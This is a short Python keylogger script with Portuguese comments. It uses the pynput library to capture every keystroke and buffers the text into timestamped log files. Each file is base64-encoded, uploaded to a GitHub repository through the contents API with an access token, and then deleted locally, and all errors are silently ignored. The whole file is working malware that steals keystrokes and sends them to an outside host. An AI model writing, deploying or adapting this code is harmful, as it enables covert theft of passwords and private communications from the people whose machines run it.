import os
import base64
import requests
from datetime import datetime
from pynput.keyboard import Key, Listener

# GitHub config
GITHUB_USER = 'Jos4f4'
GITHUB_REPO = 'teste'
GITHUB_TOKEN = '' #token de acesso

# Keylogger config
CHAR_LIMIT = 1000
LOG_DIR = '.'

fullog = ''
words = ''

def get_timestamped_filename():
    now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    return f'log_{now}.txt'

def upload_to_github(file_path, repo_filename):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        content_base64 = base64.b64encode(content).decode('utf-8')

        url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{repo_filename}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github+json"
        }

        data = {
            "message": f"Adicionando {repo_filename} via keylogger",
            "content": content_base64
        }

        put_resp = requests.put(url, headers=headers, json=data)

        if put_resp.status_code in [200, 201]:
            os.remove(file_path)

    except Exception:
        pass  # Erros são silenciosamente ignorados

def on_press(key):
    global words, fullog

    try:
        if key == Key.space or key == Key.enter:
            words += ' '
        elif key == Key.backspace:
            words = words[:-1]
            return
        elif key in [Key.shift, Key.shift_r, Key.shift_l]:
            return
        else:
            char = str(key).strip("'")
            words += char

        fullog += words
        words = ''

        if len(fullog) >= CHAR_LIMIT:
            filename = os.path.join(LOG_DIR, get_timestamped_filename())
            with open(filename, 'a') as f:
                f.write(fullog)
            upload_to_github(filename, os.path.basename(filename))
            fullog = ''

    except Exception:
        pass

    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
